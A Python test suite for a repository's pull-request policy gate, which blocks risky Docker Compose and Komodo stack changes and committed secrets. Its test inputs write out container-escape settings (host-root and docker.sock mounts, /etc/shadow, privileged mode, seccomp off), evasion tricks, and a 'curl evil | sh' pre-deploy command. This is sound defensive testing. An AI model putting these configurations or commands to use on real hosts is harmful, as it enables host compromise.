"""policy/gate.py on pull requests built from this repo's HEAD: what blocks, what passes,
and what the summary flags. Needs PyYAML (policy/requirements.txt); the PR tests also need
gitleaks. Run from the repo root: python3 -m unittest discover tests"""
import importlib.util
import json
import posixpath
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "policy"))
import gate  # noqa: E402

GIT = ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false",
       "-c", "core.hooksPath=/dev/null"]

APP = """\
services:
  app:
    image: busybox:1.38.0
{extra}
"""

STACK = """\
[[stack]]
name = "{name}"
[stack.config]
server = "{server}"
auto_pull = false
poll_for_updates = false
auto_update = false
webhook_enabled = false
project_name = "{name}"
repo = "shenhong96/infrastructures"
branch = "main"
git_provider = "github.com"
run_directory = "stacks/{name}"
file_paths = ["compose.yaml"]
{extra}
"""


class PR:
    """A copy of main (this repo's HEAD) with a PR branch: edit files, then check()."""

    def __init__(self, test, base):
        self.dir = Path(tempfile.mkdtemp()) / "pr"
        test.addCleanup(shutil.rmtree, self.dir.parent, True)
        shutil.copytree(base, self.dir, symlinks=True)
        subprocess.run([*GIT, "-C", str(self.dir), "checkout", "-q", "-b", "pr"], check=True)

    def write(self, path, text):
        (self.dir / path).parent.mkdir(parents=True, exist_ok=True)
        (self.dir / path).write_text(text)
        return self

    def replace(self, path, old, new):
        text = (self.dir / path).read_text()
        assert old in text, f"{old!r} not in {path}"
        return self.write(path, text.replace(old, new, 1))

    def stack(self, name="newapp", server="apps", extra="", compose=APP.format(extra="")):
        self.write(f"stacks/{name}/compose.yaml", compose)
        return self.write(f"stacks/{name}/komodo.toml", STACK.format(name=name, server=server, extra=extra))

    def check(self, ack=False):
        subprocess.run([*GIT, "-C", str(self.dir), "add", "-A", "--force"], check=True)  # a PR can commit ignored files
        subprocess.run([*GIT, "-C", str(self.dir), "commit", "-q", "--allow-empty", "-m", "pr"], check=True)
        return gate.check(self.dir, "origin/main", ack)


@unittest.skipUnless(shutil.which("gitleaks") and importlib.util.find_spec("yaml"),
                     "gitleaks and PyYAML (policy/requirements.txt) are needed")
class GateTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp())
        cls.base = cls.tmp / "main"
        cls.base.mkdir()
        archive = subprocess.run(["git", "-C", str(ROOT), "archive", "HEAD"], check=True, capture_output=True).stdout
        subprocess.run(["tar", "-x", "-C", str(cls.base)], input=archive, check=True)
        for args in (["init", "-q", "-b", "main"], ["add", "-A"], ["commit", "-q", "-m", "main"],
                     ["update-ref", "refs/remotes/origin/main", "HEAD"]):
            subprocess.run([*GIT, "-C", str(cls.base), *args], check=True)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, True)

    def pr(self):
        return PR(self, self.base)

    def assertBlocks(self, pr, text, ack=False):
        blocks, _ = pr.check(ack)
        self.assertTrue(any(text in b for b in blocks), f"no block mentions {text!r}: {blocks}")

    def assertPasses(self, pr, ack=False):
        blocks, flags = pr.check(ack)
        self.assertEqual(blocks, [])
        return dict(flags)


class Blocks(GateTest):
    def key_text(self):
        key = Path(tempfile.mkdtemp()) / "deploy_key"
        self.addCleanup(shutil.rmtree, key.parent, True)
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(key)], check=True)
        return key.read_text()

    def test_plaintext_sops_file(self):
        self.assertBlocks(self.pr().write("stacks/canary/extra.sops.env", "A=plain\n"), "not fully SOPS-encrypted")

    def test_file_that_is_never_committed(self):
        self.assertBlocks(self.pr().write("keys.txt", "AGE-SECRET-KEY-1\n"), "must never be committed")

    def test_private_key(self):
        key = Path(tempfile.mkdtemp()) / "deploy_key"
        self.addCleanup(shutil.rmtree, key.parent, True)
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(key)], check=True)
        self.assertBlocks(self.pr().write("stacks/canary/deploy_key", key.read_text()), "gitleaks flagged")

    def test_gitleaks_allow_comment(self):
        self.assertBlocks(self.pr().write("README.md", "token = abc # gitleaks:" + "allow\n"), "inline gitleaks")

    def test_privileged(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    privileged: true")), "app: privileged")

    def test_docker_sock(self):
        extra = "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock"
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "mount: /var/run/docker.sock")

    def test_host_root_mount(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    volumes:\n      - /:/host:ro")), "mount: /")

    def test_system_path_spelled_with_two_slashes(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    volumes:\n      - //etc:/x")), "mount: /etc")

    def test_long_syntax_bind(self):
        extra = "    volumes:\n      - type: bind\n        source: /root\n        target: /x"
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "mount: /root")

    def test_relative_path_out_of_the_repo(self):
        extra = "    volumes:\n      - ../../../../etc:/x"
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "mount: ../../../../etc")

    def test_path_from_a_variable(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    volumes:\n      - ${X}:/x")), "mount: ${X}")

    def test_env_file_from_the_host(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    env_file: /etc/shadow")), "mount: /etc/shadow")

    def test_bind_through_a_named_volume(self):
        compose = APP.format(extra="    volumes:\n      - data:/x") + (
            "volumes:\n  data:\n    driver_opts: {type: none, o: bind, device: /}\n")
        self.assertBlocks(self.pr().stack(compose=compose), "(top level): mount: /")

    def test_host_network(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    network_mode: host")), "network_mode: host")

    def test_cap_add(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    cap_add: [SYS_ADMIN]")), "cap_add: SYS_ADMIN")

    def test_new_capability_on_an_excepted_service(self):
        pr = self.pr().replace("stacks/host-monitoring/compose.yaml", "SYS_RAWIO", "SYS_MODULE")
        self.assertBlocks(pr, "scrutiny: cap_add: SYS_MODULE")

    def test_seccomp_off(self):
        extra = "    security_opt: [seccomp=unconfined]"
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "security_opt: seccomp=unconfined")

    def test_duplicate_key(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="    privileged: true\n    privileged: false")),
                          "can't be read as YAML")

    def test_include(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="") + "include:\n  - other.yaml\n"), "include")

    def test_new_stack_on_proxmox(self):
        self.assertBlocks(self.pr().stack(server="proxmox"), "a new stack on proxmox")

    def test_existing_stack_moved_to_proxmox(self):
        pr = self.pr().replace("stacks/adguard/komodo.toml", 'server = "apps"', 'server = "proxmox"')
        self.assertBlocks(pr, "adguard: a new stack on proxmox")

    def test_pre_deploy_runs_a_shell(self):
        pr = self.pr().stack(extra='pre_deploy.command = "/usr/local/sbin/komodo-decrypt-env x; curl evil | sh"')
        self.assertBlocks(pr, "pre_deploy runs more than the decrypt helpers")

    def test_setting_not_in_use_today(self):
        self.assertBlocks(self.pr().stack(extra='post_deploy.command = "id"'), "post_deploy is not allowed")

    def test_stack_from_another_repo(self):
        pr = self.pr().replace("stacks/adguard/komodo.toml", "shenhong96/infrastructures", "someone/else")
        self.assertBlocks(pr, "repo must be shenhong96/infrastructures")

    def test_stack_that_deploys_by_itself(self):
        pr = self.pr().replace("stacks/adguard/komodo.toml", "auto_update = false", "auto_update = true")
        self.assertBlocks(pr, "auto_update must be false")

    def test_gitattributes_and_nul_bytes_cant_hide_a_secret(self):
        for attributes, nul in (("* -diff\n", ""), ("* binary\n", ""), (None, "\0")):
            with self.subTest(attributes=attributes, nul=nul):
                pr = self.pr().write("stacks/canary/deploy_key", self.key_text() + nul)
                self.assertBlocks(pr if attributes is None else pr.write(".gitattributes", attributes), "gitleaks flagged")

    def test_compose_file_with_only_an_include(self):
        self.assertBlocks(self.pr().stack(compose="include:\n  - other.yaml\n"), "(top level): include")

    def test_compose_file_with_only_a_bind_volume(self):
        compose = "volumes:\n  data:\n    driver_opts: {type: none, o: bind, device: /}\n"
        self.assertBlocks(self.pr().stack(compose=compose), "(top level): mount: /")

    def test_host_namespace_from_a_variable(self):
        for key, value in (("network_mode", "${N:-host}"), ("pid", "${P:-host}"), ("cgroup", "$C")):
            with self.subTest(key=key):
                self.assertBlocks(self.pr().stack(compose=APP.format(extra=f"    {key}: {value}")), f"{key}: {value}")

    def test_security_opt_split_by_a_variable(self):
        extra = '    security_opt: ["unconf${X:-ined}"]'
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "security_opt: unconf${X:-ined}")

    def test_symlink_to_the_host(self):
        pr = self.pr().stack(name="b", compose=APP.format(extra="    volumes:\n      - ./link:/h"))
        (pr.dir / "stacks/b/link").symlink_to("/")
        self.assertBlocks(pr, "stacks/b/link: symlinks are not allowed")

    def test_build_context_on_the_host(self):
        for extra, finding in (("    build: /", "build: mount: /"),
                               ("    build:\n      context: /root", "build: mount: /root"),
                               ("    build:\n      context: .\n      additional_contexts:\n        x: /etc",
                                "build: mount: /etc"),
                               ("    build:\n      context: .\n      additional_contexts:\n        - x=/etc",
                                "build: mount: /etc")):
            with self.subTest(extra=extra):
                self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), finding)

    def test_compose_file_from_a_decrypted_blob(self):
        for name in (".decrypted/evil.yaml", "x.sops.yaml"):
            with self.subTest(name=name):
                pr = self.pr().stack().replace("stacks/newapp/komodo.toml", 'file_paths = ["compose.yaml"]',
                                               f'file_paths = ["compose.yaml", "{name}"]')
                self.assertBlocks(pr, f"{name} is not a plain compose file")

    def test_absolute_file_path_that_exists(self):
        outside = Path(tempfile.mkdtemp()) / "evil.yaml"
        self.addCleanup(shutil.rmtree, outside.parent, True)
        outside.write_text(APP.format(extra="    privileged: true"))
        pr = self.pr().stack().replace("stacks/newapp/komodo.toml", 'file_paths = ["compose.yaml"]',
                                       f'file_paths = ["compose.yaml", "{outside}"]')
        self.assertBlocks(pr, f"{outside} leaves the stack's folder")

    def test_key_outside_the_service_allowlist(self):
        for key, value in (("volumes_from", "[container:homepage]"), ("post_start", "[{command: id}]"),
                           ("pid", "container:x"), ("label_file", "x.env"), ("gpus", "all")):
            with self.subTest(key=key):
                self.assertBlocks(self.pr().stack(compose=APP.format(extra=f"    {key}: {value}")), f"{key} is not allowed")

    def test_top_level_key_outside_the_allowlist(self):
        self.assertBlocks(self.pr().stack(compose=APP.format(extra="") + "weird: 1\n"), "(top level): weird is not allowed")

    def test_unknown_key_in_a_file_with_no_services(self):
        self.assertBlocks(self.pr().stack(compose="weird: 1\n"), "(top level): weird is not allowed")

    def test_mount_outside_opt_and_mnt(self):
        for path in ("/var", "/var/lib", "/home", "/var/spool/cron", "/opt", "/mnt", "/tmp", "/srv", "/media",
                     "/opt/komodo", "/opt/komodo/keys", "/etc/localtime/x", "/opt/../etc"):
            with self.subTest(path=path):
                pr = self.pr().stack(compose=APP.format(extra=f"    volumes:\n      - {path}:/h"))
                self.assertBlocks(pr, "mount: " + posixpath.normpath(path))

    def test_variable_in_a_field_that_is_not_free_text(self):
        for key, value in (("user", "${U}"), ("working_dir", "/a${B}"), ("depends_on", '["${D}"]')):
            with self.subTest(key=key):
                self.assertBlocks(self.pr().stack(compose=APP.format(extra=f"    {key}: {value}")), f"{key}: ")

    def test_volume_type_from_a_variable(self):
        extra = "    volumes:\n      - type: ${T:-bind}\n        source: /\n        target: /h"
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "volumes: type: ${T:-bind}")

    def test_dict_volume_source_is_a_host_path_whatever_its_type(self):
        extra = "    volumes:\n      - type: tmpfs\n        source: /root\n        target: /h"
        self.assertBlocks(self.pr().stack(compose=APP.format(extra=extra)), "mount: /root")

    def test_network_named_host(self):
        compose = APP.format(extra="    networks: [h]") + "networks:\n  h:\n    external: true\n    name: host\n"
        self.assertBlocks(self.pr().stack(compose=compose), "networks: h: is the host network")

    def test_external_network_not_in_policy(self):
        compose = APP.format(extra="    networks: [h]") + "networks:\n  h:\n    external: true\n"
        self.assertBlocks(self.pr().stack(compose=compose), "networks: h: external")

    def test_files_on_host_stack_repointed(self):
        pr = self.pr().replace("stacks/vpn/komodo.toml", 'server = "vpn"', 'server = "apps"')
        pr.replace("stacks/vpn/komodo.toml", 'run_directory = "/root"', 'run_directory = "/opt/new"')
        self.assertBlocks(pr, "files_on_host: server must be vpn")
        self.assertBlocks(pr, "files_on_host: run_directory must be /root")

    def test_files_on_host_stack_in_another_folder(self):
        pr = self.pr()
        shutil.move(pr.dir / "stacks/vpn", pr.dir / "stacks/vpn2")
        self.assertBlocks(pr, "files_on_host: path must be stacks/vpn/komodo.toml")

    def test_proxmox_name_in_another_folder(self):
        pr = self.pr().stack(name="zzz", server="proxmox").replace("stacks/zzz/komodo.toml", 'name = "zzz"', 'name = "host-monitoring"')
        shutil.rmtree(pr.dir / "stacks/host-monitoring")
        self.assertBlocks(pr, "a new stack on proxmox")

    def test_marker_in_a_path_git_would_quote(self):
        pr = self.pr().write("stacks/canary/\u00e9.txt", "x # gitleaks:" + "allow\n")
        self.assertBlocks(pr, "inline gitleaks")

    def test_unusual_file_name(self):
        for name in ('a"b.txt', "a\\b.txt", "a\tb.txt", "a\nb.txt"):
            with self.subTest(name=name):
                self.assertBlocks(self.pr().write(f"stacks/canary/{name}", "x\n"), "unusual file name")

    def test_submodule(self):
        pr = self.pr()
        sub = pr.dir / "stacks/sub"
        sub.mkdir()
        for args in (["init", "-q"], ["commit", "-q", "--allow-empty", "-m", "s"]):
            subprocess.run([*GIT, "-C", str(sub), *args], check=True)
        self.assertBlocks(pr, "stacks/sub: submodules are not allowed")

    def test_compose_file_inside_a_sops_named_folder(self):
        pr = self.pr().write("stacks/canary/a.sops.d/evil.yaml", APP.format(extra="    privileged: true"))
        self.assertBlocks(pr, "stacks/canary/a.sops.d/evil.yaml: app: privileged")

    def test_compose_file_named_by_a_toml_that_is_not_komodo_toml(self):
        pr = self.pr().stack(name="n2", compose=APP.format(extra="    networks: [h]"))
        pr.write("stacks/n2/extra.yaml", "networks:\n  h:\n    external: true\n    name: host\n")
        pr.write("stacks/n2/zz.toml", STACK.format(name="n2", server="apps", extra="").replace(
            'file_paths = ["compose.yaml"]', 'file_paths = ["compose.yaml", "extra.yaml"]'))
        self.assertBlocks(pr, "stacks/n2/extra.yaml: (top level): networks: h: is the host network")

    def test_added_line_that_looks_like_a_file_header(self):
        pr = self.pr().write("stacks/canary/n.txt", "++ x\nt # gitleaks:" + "allow\n")
        self.assertBlocks(pr, "inline gitleaks")

    def test_added_line_after_a_carriage_return(self):
        pr = self.pr().write("stacks/canary/n.txt", "a\rt # gitleaks:" + "allow\r")
        self.assertBlocks(pr, "inline gitleaks")

    def test_komodo_toml_that_is_not_utf8(self):
        pr = self.pr().stack()
        (pr.dir / "stacks/newapp/komodo.toml").write_bytes(b"\xff\xfe")
        self.assertBlocks(pr, "stacks/newapp/komodo.toml: not valid TOML")

    def test_external_network_pinned_to_its_definition(self):
        pr = self.pr().replace("stacks/aio/compose.yaml", "traefik:\n    external: true", "traefik:\n    external: true\n    name: immich_default")
        self.assertBlocks(pr, "networks: traefik: external")

    def test_gate_file_without_your_label(self):
        pr = self.pr().write(".github/workflows/x.yml", "on: push\n")
        self.assertBlocks(pr, "gate files changed without your gate-change label: .github/workflows/x.yml")


class Passes(GateTest):
    def test_main_as_it_is(self):
        self.assertPasses(self.pr())

    def test_dependabot_image_bump(self):
        pr = self.pr().replace("stacks/canary/compose.yaml", "busybox:1.38.0@sha256:fd7dc", "busybox:1.38.1@sha256:aaaaa")
        images = self.assertPasses(pr)["Images"]
        self.assertEqual(len(images), 1)
        self.assertIn("(pinned by digest)", images[0])

    def test_ordinary_new_stack(self):
        flags = self.assertPasses(self.pr().stack())
        self.assertEqual(flags["Stacks"], ["stacks/newapp: newapp on apps"])
        self.assertIn("(not pinned by digest)", flags["Images"][0])

    def test_variables_in_free_text_and_a_named_volume(self):
        extra = ("    environment:\n      A: ${X}\n    command: echo ${Y}\n    volumes:\n"
                 "      - type: volume\n        source: data\n        target: /d\n      - /opt/newapp/data:/data")
        self.assertPasses(self.pr().stack(compose=APP.format(extra=extra)))

    def test_mount_below_a_second_level_directory(self):
        pr = self.pr().stack(compose=APP.format(extra="    volumes:\n      - /opt/newapp/data:/data\n      - /mnt/ssd/x:/y"))
        self.assertPasses(pr)

    def test_binary_file_in_a_stack(self):
        pr = self.pr()
        (pr.dir / "stacks/canary/logo.png").write_bytes(bytes(range(256)))
        self.assertPasses(pr)

    def test_gate_file_with_your_label(self):
        flags = self.assertPasses(self.pr().write(".github/workflows/x.yml", "on: push\n"), ack=True)
        self.assertEqual(flags["Gate files"], [".github/workflows/x.yml"])


class Flags(GateTest):
    TASK = "\n- name: Fetch\n  ansible.builtin.shell: curl example.com\n  delegate_to: localhost\n"

    def test_tasks_check_mode_cant_preview_and_tasks_on_control(self):
        pr = self.pr()
        pr.write("ansible/roles/samba/tasks/main.yml", (pr.dir / "ansible/roles/samba/tasks/main.yml").read_text() + self.TASK)
        flags = self.assertPasses(pr)
        self.assertEqual(flags["Ansible roles"], ["samba"])
        self.assertEqual(len(flags["New tasks check mode can't preview"]), 1)
        self.assertEqual(len(flags["Tasks and lookups that run on control"]), 1)
        self.assertEqual(flags["Needs a laptop run: merging won't apply it"], [])

    def test_laptop_only_role(self):
        pr = self.pr()
        pr.write("ansible/roles/tailscale/tasks/main.yml", (pr.dir / "ansible/roles/tailscale/tasks/main.yml").read_text() + "\n")
        self.assertEqual(self.assertPasses(pr)["Needs a laptop run: merging won't apply it"], ["role tailscale (tag tailscale)"])

    def test_base_also_runs_on_proxmox(self):
        pr = self.pr()
        pr.write("ansible/roles/base/tasks/main.yml", (pr.dir / "ansible/roles/base/tasks/main.yml").read_text() + "\n")
        self.assertIn("role base on proxmox (a merge applies it to the containers only)",
                      self.assertPasses(pr)["Needs a laptop run: merging won't apply it"])

    def test_site_yml(self):
        pr = self.pr()
        pr.write("ansible/site.yml", (pr.dir / "ansible/site.yml").read_text() + "\n")
        self.assertTrue(self.assertPasses(pr)["ansible/site.yml changed"])

    def test_cli_writes_the_check_and_the_comment(self):
        pr = self.pr().stack(server="proxmox")
        subprocess.run([*GIT, "-C", str(pr.dir), "add", "-A", "--force"], check=True)  # a PR can commit ignored files
        subprocess.run([*GIT, "-C", str(pr.dir), "commit", "-q", "-m", "pr"], check=True)
        out = pr.dir.parent / "out"
        gate.main(["--pr", str(pr.dir), "--head-sha", "abc123", "--out", str(out)])
        body = json.loads((out / "check.json").read_text())
        self.assertEqual((body["name"], body["head_sha"], body["conclusion"]), ("gate", "abc123", "failure"))
        self.assertTrue((out / "comment.md").read_text().startswith("<!-- gate -->\n### gate: blocked"))


class Units(unittest.TestCase):
    def test_gate_files(self):
        for path in (".github/workflows/ci.yml", "policy/gate.py", ".sops.yaml", "komodo/servers.toml",
                     "ansible/ansible.cfg", "ansible.cfg", "ansible/connection_plugins/pct.py",
                     "ansible/roles/x/library/m.py", "ansible/roles/x/filter_plugins/f.py",
                     "ansible/collections/ansible_collections/a/b/plugins/vars/v.py", ".gitleaksignore",
                     "ansible/roles/semaphore/defaults/main.yml", "ansible/roles/github/tasks/main.yml"):
            self.assertTrue(gate.is_gate_file(path), path)
        for path in ("ansible/site.yml", "ansible/roles/base/tasks/main.yml", "stacks/aio/compose.yaml", "README.md"):
            self.assertFalse(gate.is_gate_file(path), path)

    def test_gitattributes_is_a_gate_file(self):
        for path in (".gitattributes", "stacks/x/.gitattributes", "ansible/roles/y/files/.gitattributes"):
            self.assertTrue(gate.is_gate_file(path), path)

    def test_summary_is_capped(self):
        text = gate.render([f"stacks/x/compose.yaml: finding number {i}" for i in range(2000)], [("Images", ["i"] * 2000)])
        self.assertLess(len(text), 60000)
        self.assertIn("- and 1950 more", text)

    def test_harmless_mounts(self):
        for src in ("./config", "/etc/localtime", "/mnt/storage/media", "/opt/caddy/conf", "data/../config"):
            self.assertIsNone(gate.mount_finding(src), src)

    def test_summary_escapes_pr_text(self):
        text = gate.render(["stacks/x/compose.yaml: @someone <img src=x> `y`\n### gate: passes"], [])
        self.assertNotIn("\n### gate: passes", text)
        self.assertIn("\\@someone \\<img src=x\\>", text)


if __name__ == "__main__":
    unittest.main()
